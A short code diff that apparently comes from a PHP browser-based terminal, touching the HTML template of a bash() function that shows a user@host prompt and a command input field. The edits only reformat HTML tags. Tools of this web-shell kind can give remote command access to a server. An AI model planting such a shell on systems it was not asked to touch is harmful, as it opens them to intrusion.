@@ -32,8 +32,7 @@ function bash()
   $processUser = posix_getpwuid(posix_geteuid());
   $prompt = '<span id="prompt">'.$processUser['name'].'@'.php_uname('n').':<span id="dir">~</span>$ </span>';
   echo <<<END_OF_HTML
-<html>
-<head>
+<html><head>
 <style>
 $style
 </style>
@@ -123,8 +122,7 @@ document.onkeypress = function doSomething(e) {
 </pre><pre style="display:inline;padding:0;margin:0;">
 <form style="display:inline; padding:0; margin:0;" onsubmit="return onenter();">$prompt<input style="font-family:mono; font-size:12px; color: black; padding:0; margin:0; border:0; width:40em;" type="text" name="command" autocomplete="off"\></form>
 <div>$suggestions</div>
-</body>
-</html>
+</body></html>
 END_OF_HTML;
 }
 
